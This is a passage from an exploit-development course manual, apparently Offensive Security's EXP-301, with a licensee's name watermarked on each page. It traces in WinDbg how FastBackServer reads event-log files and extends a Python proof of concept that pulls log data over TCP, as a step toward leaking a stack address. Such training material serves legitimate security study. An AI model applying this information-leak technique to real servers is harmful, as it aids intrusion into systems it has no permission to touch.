OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
532 
 
Figure 194: Initial loop condition 
In this basic block, a value is moved into EDX and subsequently onto the stack. It is then used as 
a comparison against 0. 
To discover the value at runtime, we will step into SFILE_S_FindFileIndexForRead with WinDbg and 
go to the comparison as shown in Listing 659. 
eax=0005fe36 ebx=060fae50 ecx=00a99f40 edx=00000028 esi=060fae50 edi=00669360 
eip=00499c12 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0x56: 
00499c12 83bdccfdffff00  cmp     dword ptr [ebp-234h],0 ss:0023:0db5deb0=00000028 
Listing 659 - Comparison on file suffix 
We’ll find the value 0x28 or decimal 40, which is the maximum suffix value. 
The comparison in this basic block controls the iterations through the loop. It is likely the 
assembly code stemming from a compiled C-style while loop, as illustrated in Listing 660. 
while(file_suffix > 0) 
{ 
 // Action in loop 
} 
Listing 660 - C pseudocode for while loop 
The loop starts with the maximum suffix value of the event log files, so we can suspect that the 
purpose of the loop is to determine which log file to read from. 
To help in our analysis, let’s try to put ourselves into the shoes of the developer. One way to 
programmatically figure out which file to read from is to use the Start value as an index. 
Listing 661 shows an example of C pseudocode for accomplishing this. 
index = total log size  
while(file_suffix > 0) 
{ 
  index = index - sizeof(current log file) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
533 
  if(Start value >= index) 
  { 
    // We found the right log file 
  } 
  go to next log file 
} 
Listing 661 - C pseudocode for function of loop 
We’ll begin by getting the size of all log files, then subtracting the size of the current log file and 
checking if the supplied Start value is greater. If it is, we want to read from the current log file. If it 
is not greater, we’ll go to the next log file. 
Programming knowledge can help us understand how a developer might 
implement a specific piece of functionality. 
Let’s test if our pseudocode is accurate by going through the contents of the loop. 
Inside the loop, we will first come across a call to the snprintf382 format string function, as shown 
in Figure 195. 
 
Figure 195: Call to snprintf 
To better understand this call, the function prototype for snprintf is given below: 
int snprintf ( char * s, size_t n, const char * format, ... ); 
Listing 662 - Function prototype for snprintf 
The first two arguments are the destination buffer and the maximum number of bytes to be used 
in the buffer. This is followed by the format string, in this case, “%s%03u%s” as displayed in Figure 
195, and the associated arguments for the format string specifiers. 
Let’s step to the call in WinDbg to check the supplied arguments. 
eax=0db5dedc ebx=060fae50 ecx=00000028 edx=00a99f40 esi=060fae50 edi=00669360 
eip=00499c40 esp=0db5de94 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
 
382 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/snprintf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
534 
FastBackServer!SFILE_S_FindFileIndexForRead+0x84: 
00499c40 e866021c00      call    FastBackServer!ml_snprintf (00659eab) 
 
0:001> dds esp L6 
0db5de94  0db5dedc 
0db5de98  00000208 
0db5de9c  00798c28 FastBackServer!securityLevel+0x51e4 
0db5dea0  00a99f40 FastBackServer!EventLOG_sSFILE 
0db5dea4  00000028 
0db5dea8  00798c24 FastBackServer!securityLevel+0x51e0 
 
0:001> da 00798c28 
00798c28  "%s%03u%s" 
 
0:001> da 00a99f40 
00a99f40  "C:/ProgramData/Tivoli/TSM/FastBa" 
00a99f60  "ck/server/FAST_BACK_SERVER" 
Listing 663 - Format string to create file name 
Given the arguments, it appears that snprintf creates the full log filename for each iteration of the 
loop. 
We can step over the call to find the file name in the first iteration of the loop. 
0:001> p 
eax=00000040 ebx=060fae50 ecx=0db5de4c edx=0db5df1b esi=060fae50 edi=00669360 
eip=00499c45 esp=0db5de94 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0x89: 
00499c45 83c418          add     esp,18h 
 
0:001> da 0db5dedc 
0db5dedc  "C:/ProgramData/Tivoli/TSM/FastBa" 
0db5defc  "ck/server/FAST_BACK_SERVER040.sf" 
0db5df1c  "" 
Listing 664 - Full file name is created 
From the contents of the output buffer, we find the full file name for the event log file with the 
maximum suffix, as expected. 
To move forward with our analysis, we’ll continue inside the same basic block and find that a call 
to the HANDLE_MGR_Open function takes place, as shown in Figure 196. 
 
Figure 196: Open handle to log file 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
535 
 
This is another custom function, but given its name and the fact that we are hoping to read from 
a file, it makes sense that HANDLE_MGR_Open will likely open a handle to the log file. 
We’ll also notice a subsequent check against the value 0xFFFFFFFF, which is the typical error 
value of an invalid handle (INVALID_HANDLE_VALUE). 
We can step to this call in WinDbg, as given in Listing 665. 
eax=00000040 ebx=060fae50 ecx=0db5dedc edx=0db5df1b esi=060fae50 edi=00669360 
eip=00499c5d esp=0db5dea0 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0xa1: 
00499c5d e8ac89feff      call    FastBackServer!HANDLE_MGR_Open (0048260e) 
 
0:001> dds esp L3 
0db5dea0  0db5dedc 
0db5dea4  00000000 
0db5dea8  00000001 
 
0:001> da poi(esp) 
0db5dedc  "C:/ProgramData/Tivoli/TSM/FastBa" 
0db5defc  "ck/server/FAST_BACK_SERVER040.sf" 
0db5df1c  "" 
 
0:001> p 
eax=0000015e ebx=060fae50 ecx=0db5de28 edx=77e71670 esi=060fae50 edi=00669360 
eip=00499c62 esp=0db5dea0 ebp=0db5e0e4 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
FastBackServer!SFILE_S_FindFileIndexForRead+0xa6: 
00499c62 83c40c          add     esp,0Ch 
Listing 665 - Open handle to log file 
After we step over the call, we’ll note that EAX contains a value different from the invalid handle. 
This means that we pass the comparison and move to the next basic block. 
Figure 197 shows the upper part of the next basic block. 
 
Figure 197: Calculating an offset 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
536 
 
First let’s examine the call to HANDLE_MGR_fstat, which accepts the event log file name along 
with an output buffer. 
While we don’t know what this function does, Figure 197 shows us that the “size” field of the 
output buffer is used in the lower highlighted part. 
Listing 666 shows the content of the output buffer before and after the call. 
eax=0000015e ebx=060fae50 ecx=0db5de28 edx=0db5deb8 esi=060fae50 edi=00669360 
eip=00499c89 esp=0db5dea4 ebp=0db5e0e4 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
FastBackServer!SFILE_S_FindFileIndexForRead+0xcd: 
00499c89 e8f198feff      call    FastBackServer!HANDLE_MGR_fstat (0048357f) 
 
0:001> dd poi(esp+4) L8 
0db5deb8  00000000 00000000 00000000 00000000 
0db5dec8  00000000 00000000 00000000 00000000 
 
0:001> p 
eax=00000000 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360 
eip=00499c8e esp=0db5dea4 ebp=0db5e0e4 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!SFILE_S_FindFileIndexForRead+0xd2: 
00499c8e 83c408          add     esp,8 
 
0:001> dd 0db5deb8 L8 
0db5deb8  00000000 81b60000 00000001 00000000 
0db5dec8  00000000 000ac603 5ea6e6ce 5ea8ad2a 
Listing 666 - Call to HANDLE_MGR_fstat 
We’ll note that the output buffer has been populated with data. The highlighted DWORD at offset 
0x14 into the buffer is important since it equates to the size field, as noted in Figure 197. 
We can find the numerical value by single-stepping to the instruction where it’s moved into EAX. 
eax=00000001 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360 
eip=00499ca0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0xe4: 
00499ca0 8b85e8fdffff    mov     eax,dword ptr [ebp-218h] ss:0023:0db5decc=000ac603 
Listing 667 - Content of size field 
To get an idea of what will happen next, let’s recall the pseudocode for the loop, repeated below: 
index = total log size  
while(file_suffix > 0) 
{ 
  index = index - sizeof(current log file) 
  if(Start value >= index) 
  { 
    // We found the right log file 
  } 
  go to next log file 
} 
Listing 668 - C pseudocode for function of loop 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
537 
The application retrieves the size of the current log file, which must be subtracted from the total 
log file size. The result is then compared to the supplied Start value. 
The lower part of the basic block we analyzed is shown in Figure 198. 
 
Figure 198: Calculation and comparison of an offset 
There’s a lot happening in this basic block, so let’s split the activity into four separate parts for 
analysis. 
In the first highlighted part, the size of the current log file is moved into EAX. The CDQ383 
instruction extends the sign bit of EAX into EDX. This means if the uppermost bit of EAX is set, 
EDX will be set to 0xFFFFFFFF. EDX will otherwise be set to 0. 
mov     eax, [ebp+var_22C.st_size] 
cdq 
Listing 669 - Sign extension 
Next, EDX is masked with 0xFF to extract the least significant byte as an unsigned integer. The 
result is added to EAX. 
and     edx, 0FFh 
add     eax, edx 
Listing 670 - Conversion to unsigned integer 
Finally, EAX is right-shifted by 8 bits through the SAR384 instruction. This is likely to convert the 
size to an index. 
sar     eax, 8 
Listing 671 - Right-shifting by 8 bits 
Listing 672 shows the results of the calculation on the first iteration of the loop. 
eax=00000001 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360 
eip=00499ca0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
 
383 (Aldeid, 2016), https://www.aldeid.com/wiki/X86-assembly/Instructions/cdq 
384 (Aldeid, 2019), https://www.aldeid.com/wiki/X86-assembly/Instructions/shr 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
538 
FastBackServer!SFILE_S_FindFileIndexForRead+0xe4: 
00499ca0 8b85e8fdffff    mov     eax,dword ptr [ebp-218h] ss:0023:0db5decc=000ac603 
 
0:001> p 
... 
eax=00000ac6 ebx=060fae50 ecx=0db5de5c edx=00000000 esi=060fae50 edi=00669360 
eip=00499cb2 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0xf6: 
00499cb2 8b95c8fdffff    mov     edx,dword ptr [ebp-238h] ss:0023:0db5deac=00000000 
0:001>  
Listing 672 - Calculating index value of current log file 
In this case, the size value of 0xac603 resulted in an index value of 0xac6, as stored in EAX. 
With the index value of the current log file calculated, we’ll move to the next highlighted portion of 
the basic block. 
In this section, a value is retrieved into EDX, EAX is added to it, and it is written back to the same 
memory location. 
mov     edx, [ebp+var_238] 
add     edx, eax 
mov     [ebp+var_238], edx 
Listing 673 - Getting the accumulator value 
This is essentially an accumulator to be used in the next iteration of the loop. 
The third portion of the basic block retrieves the maximum index of the log into ECX and 
subtracts the current index, as shown in Listing 674. 
mov     eax, dword ptr [ebp+arg_0] 
mov     ecx, [eax+210h] 
sub     ecx, [ebp+var_238] 
Listing 674 - Calculating the index difference 
We can observe this calculation in WinDbg. 
eax=00000ac6 ebx=060fae50 ecx=0db5de5c edx=00000ac6 esi=060fae50 edi=00669360 
eip=00499cc0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0x104: 
00499cc0 8b4508          mov     eax,dword ptr [ebp+8] 
ss:0023:0db5e0ec={FastBackServer!EventLOG_sSFILE (00a99f40)} 
 
0:001> p 
eax=00a99f40 ebx=060fae50 ecx=0db5de5c edx=00000ac6 esi=060fae50 edi=00669360 
eip=00499cc3 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_S_FindFileIndexForRead+0x107: 
00499cc3 8b8810020000    mov     ecx,dword ptr [eax+210h] ds:0023:00a9a150=0005fe36 
 
0:001> p 
eax=00a99f40 ebx=060fae50 ecx=0005fe36 edx=00000ac6 esi=060fae50 edi=00669360 
eip=00499cc9 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
539 
FastBackServer!SFILE_S_FindFileIndexForRead+0x10d: 
00499cc9 2b8dc8fdffff    sub     ecx,dword ptr [ebp-238h] ss:0023:0db5deac=00000ac6 
 
0:001> p 
eax=00a99f40 ebx=060fae50 ecx=0005f370 edx=00000ac6 esi=060fae50 edi=00669360 
eip=00499ccf esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!SFILE_S_FindFileIndexForRead+0x113: 
00499ccf 3b4d0c          cmp     ecx,dword ptr [ebp+0Ch] ss:0023:0db5e0f0=00000100 
Listing 675 - Calculating index to start of current log file 
Once the subtraction is done, ECX contains an index value to the start of the current log file. 
In the last highlighted section, a comparison between the current log file index and the Start value 
is performed. We’ll only exit the loop if our supplied value is larger than the current log file index. 
While there are several calculations performed, the logic corresponds to our proposed 
pseudocode. 
This understanding leaves us with a challenge. To obtain the leaked stack address, we’ll need to 
read from the newest entries in the log file with suffix 40. We cannot predict which Start value is 
required, since it will depend on the amount of content in the event log. 
We will solve this problem in a later section. For now, let’s focus on obtaining any content from 
the event log and returning it to our Kali machine. 
11.3.3.1 Exercise 
1. 
Follow and repeat the analysis to understand how the Start value works. 
11.3.4 
Read From the Log 
In the previous section, we learned how the Start value we supply determines which log file is 
used. Next, let’s find out if the content is read from the event log at all. 
Our supplied Start value is quite small compared to the total index value. As a result, we expect 
one of the oldest log files to be chosen. This will have the lowest number in the suffix. 
Let’s continue our analysis of the loop inside SFILE_S_FindFileIndexForRead. To determine what 
our 
Start 
value 
corresponds 
to, 
we 
can 
set 
a 
breakpoint 
at 
FastBackServer!SFILE_S_FindFileIndexForRead+0x118 where we exit the loop. 
0:001> bp FastBackServer!SFILE_S_FindFileIndexForRead+0x118 
 
0:001> g 
Breakpoint 1 hit 
eax=00a99f40 ebx=060fae50 ecx=00000000 edx=0005fe36 esi=060fae50 edi=00669360 
eip=00499cd4 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei ng nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287 
FastBackServer!SFILE_S_FindFileIndexForRead+0x118: 
00499cd4 8b5510          mov     edx,dword ptr [ebp+10h] ss:0023:0db5e0f4=0db5e318 
Listing 676 - Exiting the loop 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
540 
The algorithm has now found the correct log file, but not the location inside of it. The Start value 
we supplied was only compared to the index value of the start of the log file. The last step is to 
find the index into the specific file. 
Since we supplied the low value of 0x100, a good assumption is that we will be reading from the 
first event log file. The suffix will depend on how many log files have been created. If the 
application has been running for a while, this suffix may be as low as 001. 
As the last step of SFILE_S_FindFileIndexForRead, we find where in the selected log file we should 
read from. This location is also based on the Start value. In our current example, we used the 
small Start value of 0x100. This value will force a selection of the oldest log file that starts at the 
index value of 0. This means the Start value is also the index inside the specified file. 
As another example, let’s imagine that the event log file with a suffix of 020 starts at the index 
value 
0x20000 
and 
we 
provide 
a 
Start 
value 
of 
0x20200. 
In 
our 
example, 
SFILE_S_FindFileIndexForRead would determine that it should read at index 0x200 inside that log 
file. 
After returning to SFILE_ReadBlock, we’ll encounter a few checks followed by a call to ml_fopen, 
as displayed in Figure 199. 
 
Figure 199: Opening a handle to the log file 
Reviewing this call in WinDbg, we can inspect the supplied file name and verify which suffix was 
chosen. 
eax=00000040 ebx=060fae50 ecx=0db5e09c edx=0db5e110 esi=060fae50 edi=00669360 
eip=00499e18 esp=0db5e0f4 ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_ReadBlock+0x110: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
541 
00499e18 e897031c00      call    FastBackServer!ml_fopen (0065a1b4) 
 
0:001> da poi(esp) 
0db5e110  "C:/ProgramData/Tivoli/TSM/FastBa" 
0db5e130  "ck/server/FAST_BACK_SERVER001.sf" 
0db5e150  "" 
Listing 677 - Log file with suffix 001 is chosen 
In this case, FastBackServer has been installed for an extended duration, so all 40 event log files 
have been created and the Start value of 0x100 corresponds to the file with a suffix of 001. 
If the application has been running for a long time, our Start value might not exist 
because it’s too small. 
With the file selected and opened, we need to set the position to read from. In the following basic 
block, a call to fseek385 is performed. 
 
Figure 200: Setting read position in the log file 
To understand what fseek does, let’s start by analyzing the function prototype, as given in Listing 
678. 
int fseek (  
  FILE * stream,  
  long int offset,  
  int origin ); 
Listing 678 - Function prototype for fseek 
The API accepts three arguments. The first (stream) is a handle to the file, the second (offset) is 
the offset into the file, and the last (origin) is the position the offset is counted from. 
When fseek finishes executing, the position to read from using an API, like fread, is updated. This 
position is set through the second and third arguments. 
 
385 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fseek/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
542 
To obtain the current values in WinDbg, let’s step to the call into fseek where we can display the 
arguments. 
eax=00010000 ebx=060fae50 ecx=008c8408 edx=77e71670 esi=060fae50 edi=00669360 
eip=00499e47 esp=0db5e0f0 ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_ReadBlock+0x13f: 
00499e47 e8d7ff1c00      call    FastBackServer!fseek (00669e23) 
 
0:001> dds esp L3 
0db5e0f0  008c8408 FastBackServer!_iob+0x80 
0db5e0f4  00010000 
0db5e0f8  00000000 
Listing 679 - Arguments for fseek 
The output above shows that the Start value we supplied is converted to 0x10000. This equates 
to a left-shift of 8 bits, after which the value is supplied as the offset argument for fseek. 
At this point, we’ve located the code that selects the desired event log file and calculates the 
offset into it. We then found a call to ml_fopen that gets a handle to the log file. Finally, we found a 
call to fseek that sets the position inside the file. 
Our last step is to read from the file. 
If we continue our analysis of the code in IDA Pro, we find that this is done with fread in a 
subsequent basic block, as shown in Figure 201. 
 
Figure 201: Reading from the log file 
fread uses the position set by fseek to read data. The amount of data read is not yet clear to us. 
When we called into SFILE_ReadBlock, values parsed from the format string were used as 
arguments. The format string is repeated in Listing 680. 
buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200) 
Listing 680 - Format string in our PoC 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
543 
The first value we dealt with inside SFILE_ReadBlock was the Start value. The second value, 
Length, was provided to SFILE_ReadBlock as the third argument. 
The Start value determines which log file and which offset into it we will read from. The Length 
value appears in the basic block shown in Figure 201 because it’s stored at EBP+arg_8, which is 
the third argument for SFILE_ReadBlock. 
After some modifications, the Length value is supplied as the third argument to fread, which 
represents the number of elements to read. 
To examine the values supplied to fread, we’ll let WinDbg catch up, as shown in Listing 681. 
eax=008c8408 ebx=060fae50 ecx=00000020 edx=77e71670 esi=060fae50 edi=00669360 
eip=00499e6b esp=0db5e0f8 ebp=0db5e31c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!SFILE_ReadBlock+0x163: 
00499e6b 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0db5e32c=00000200 
 
0:001> p 
eax=008c8408 ebx=060fae50 ecx=00000200 edx=77e71670 esi=060fae50 edi=00669360 
eip=00499e6e esp=0db5e0f8 ebp=0db5e31c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!SFILE_ReadBlock+0x166: 
00499e6e c1e108          shl     ecx,8 
 
0:001> p 
... 
eax=008c8408 ebx=060fae50 ecx=00020000 edx=018943a8 esi=060fae50 edi=00669360 
eip=00499e84 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!SFILE_ReadBlock+0x17c: 
00499e84 e8b9d91c00      call    FastBackServer!fread (00667842) 
 
0:001> dds esp L4 
0db5e0ec  018943a8 
0db5e0f0  00000001 
0db5e0f4  00020000 
0db5e0f8  008c8408 FastBackServer!_iob+0x80 
Listing 681 - Arguments for fread 
First, we’ll notice that the Length value is left-shifted by 8 bits, so our input value of 0x200 
becomes 0x20000. Just before calling fread, we find that this value is supplied to fread as the 
number of elements to read. 
We’ll inspect the output buffer for fread after the call to it has completed, as shown in Listing 682. 
0:001> p 
eax=00020000 ebx=060fae50 ecx=00000020 edx=00020000 esi=060fae50 edi=00669360 
eip=00499e89 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!SFILE_ReadBlock+0x181: 
00499e89 83c410          add     esp,10h 
 
0:001> da 018943a8 
018943a8  "  .[Apr 22 00:10:04:998](15b4)->" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
544 
018943c8  "I4.GENERAL  .:.|tOA             " 
018943e8  "              |     0|200000|199" 
01894408  "000|199000|      0|   17496|    " 
01894428  "0.00|    0.17|PRIORITY|         " 
01894448  "                                " 
01894468  "                                " 
01894488  "                                " 
018944a8  "  .[Apr 22 00:10:05:013](15b4)->" 
018944c8  "I4.GENERAL  .:.|----------------" 
018944e8  "--------------|------|------|---" 
01894508  "---|------|-------|--------|----" 
Listing 682 - Content from the log file has been read 
We can observe that content similar to that which we found in the event log earlier has been read 
into the output buffer. 
To verify that the content of the buffer does indeed come from the log file, we can use the Select-
String cmdlet386 to locate the same content inside the log file with the lowest suffix, in our case 
FAST_BACK_SERVER001.sf. 
PS C:\Tools> Select-String 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf -Pattern '[Apr 22 
00:10:04:998]' -SimpleMatch 
 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:255:[Apr 22 
00:10:04:998](15b4)->I4.GENERAL    :       | 
                         |      |      |      |Abort |       |        |MB      |MB      
|Type    | 
 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:256:[Apr 22 
00:10:04:998](15b4)->I4.GENERAL    :        
|------------------------------|------|------|------|------|-------|--------|--------
|--------|--------| 
 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:257:[Apr 22 
00:10:04:998](15b4)->I4.GENERAL    :       |tOA 
                         |     0|200000|199000|199000|      0|   17496|    0.00|    
0.17|PRIORITY| 
Listing 683 - Search for string in event log file 
The highlighted portion of Listing 683 confirms that the content read into the output buffer by 
fread does indeed come from the correct event log file. Excellent! 
In this section, we managed to read content from the event log based on the Start and Length 
values we supplied. The last step is to find out how to return the content that was read to us. 
11.3.4.1 Exercise 
1. 
Follow and repeat the analysis to understand how the Length value works and read content 
from the event log. 
 
386 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-
string?view=powershell-7 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
545 
11.3.5 
Return the Log Content 
Now that we’ve found a code path that allows us to read from the event log, we need to learn how 
to return that data to our Kali machine. Given that an opcode triggers a read from the event log, it 
stands to reason that the result should be passed somewhere, otherwise it is not of much use. 
In the previous module, we found that FXCLI_OraBR_Exec_Command contains functionality to 
return data through TCP packets. We need to ensure that our event log data follows the same 
path. 
After reading the contents from the event log file, a short epilogue is executed, after which we can 
exit SFILE_ReadBlock and return back into FXCLI_OraBR_Exec_Command. 
 
Figure 202: Return value check 
After returning from SFILE_ReadBlock, we find a null value check on the function return value. 
Let’s quickly check this value in WinDbg by continuing execution until the function returns and 
stepping out of it: 
0:001> pt 
eax=00020000 ebx=060fae50 ecx=0db5e0d4 edx=77e71670 esi=060fae50 edi=00669360 
eip=00499f19 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!SFILE_ReadBlock+0x211: 
00499f19 c3              ret 
 
0:001> p 
eax=00020000 ebx=060fae50 ecx=0db5e0d4 edx=77e71670 esi=060fae50 edi=00669360 
eip=00570f08 esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x4a52: 
00570f08 83c410          add     esp,10h 
Listing 684 - Return value of SFILE_ReadBlock is number of bytes read 
As highlighted in Listing 684, the return value of SFILE_ReadBlock is the number of bytes read 
from the log file. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
546 
This means we will trigger the JNZ and, after another jump, reach the basic block shown in Figure 
203. 
 
Figure 203: Code path that leads to data return 
As we’ll recall from a previous module, this is the starting branch that enables our data to be 
returned to us. We seem to be on the right track. 
When we trace execution, we will find ourselves following the same path through the checks until 
we reach FXCLI_IF_Buffer_Send, as shown in Figure 204. 
 
Figure 204: Arguments for FXCLI_IF_Buffer_Send 
To check the arguments, we can single step in WinDbg to the call into FXCLI_IF_Buffer_Send and 
dump them: 
eax=018943a8 ebx=060fae50 ecx=04f91020 edx=00020000 esi=060fae50 edi=00669360 
eip=00575d2d esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x9877: 
00575d2d e8817d0000      call    FastBackServer!FXCLI_IF_Buffer_Send (0057dab3) 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
547 
0:001> dds esp L4 
0db5e324  018943a8 
0db5e328  00020000 
0db5e32c  04f91020 
0db5e330  00000001 
 
0:001> da 018943a8 
018943a8  "  .[Apr 22 00:10:04:998](15b4)->" 
018943c8  "I4.GENERAL  .:.|tOA             " 
018943e8  "              |     0|200000|199" 
01894408  "000|199000|      0|   17496|    " 
01894428  "0.00|    0.17|PRIORITY|         " 
... 
Listing 685 - Arguments for FXCLI_IF_Buffer_Send 
The first argument does indeed contain the event log entry content that was read. The second 
argument, highlighted in Listing 685, is also the size of the data that was read. 
Next, let’s update our Python code to receive a response from the socket. This small change is 
highlighted in Listing 686. 
... 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((server, port)) 
 
s.send(buf) 
response = s.recv(1024) 
print(response) 
 
s.close() 
... 
Listing 686 - Add a recv call to our code 
To run our new proof of concept, we can remove all breakpoints in WinDbg and let execution 
continue. 
kali@kali:~$ python3 poc.py 192.168.120.10 
b'\x00\x02\x00\x00  \n[Apr 22 00:10:04:998](15b4)->I4.GENERAL  \t:\t|tOA                           
|     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|                           
\n[Apr 22 00:10:05:013](15b4)->I4.GENERAL  \t:\t|------------------------------|------
|------|------|------|-------|--------|--------|--------|--------|                                  
\n[Apr 22 00:10:05:013](15b4)->I4.GENERAL  \t:\t|tFXC                          |     
0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|                                 
